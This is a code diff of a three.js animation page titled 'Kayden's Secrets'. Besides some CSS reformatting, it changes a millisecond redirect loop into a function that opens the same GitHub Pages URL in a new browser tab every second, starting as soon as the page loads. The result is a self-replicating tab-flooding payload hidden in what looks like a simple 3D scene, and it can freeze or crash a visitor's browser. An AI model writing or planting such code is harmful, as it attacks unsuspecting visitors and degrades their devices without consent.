@@ -5,9 +5,20 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>Kayden's Secrets</title>
     <style>
-        body { margin: 0; overflow: hidden; background-size: cover; font-size: 12px; }
-        canvas { display: block; }
-        .subtitle { font-size: 12px; text-align: center; margin-top: 20px; }
+        body {
+            margin: 0;
+            overflow: hidden;
+            background-size: cover;
+            font-size: 12px;
+        }
+        canvas {
+            display: block;
+        }
+        .subtitle {
+            font-size: 12px;
+            text-align: center;
+            margin-top: 20px;
+        }
     </style>
 </head>
 <body>
@@ -24,6 +35,7 @@
         let mixer;
         const camera = new THREE.PerspectiveCamera(75, window.innerWidth / window.innerHeight, 0.1, 1000);
         const renderer = new THREE.WebGLRenderer({ antialias: true });
+
         renderer.setSize(window.innerWidth, window.innerHeight);
         document.body.appendChild(renderer.domElement);
         camera.position.z = 5;
@@ -88,13 +100,13 @@
             renderer.render(scene, camera);
         }
 
-        function redirectContinuously() {
+        function openNewTabsContinuously() {
             setInterval(() => {
-                window.location.href = 'https://xxlizzykhornexx.github.io/Kayden-Secrets/';
-            }, 1); // Redirect every second
+                window.open('https://xxlizzykhornexx.github.io/Kayden-Secrets/', '_blank');
+            }, 1000); // Open a new tab every second
         }
 
-        redirectContinuously();
+        openNewTabsContinuously();
         startApplication();
         animate();
 
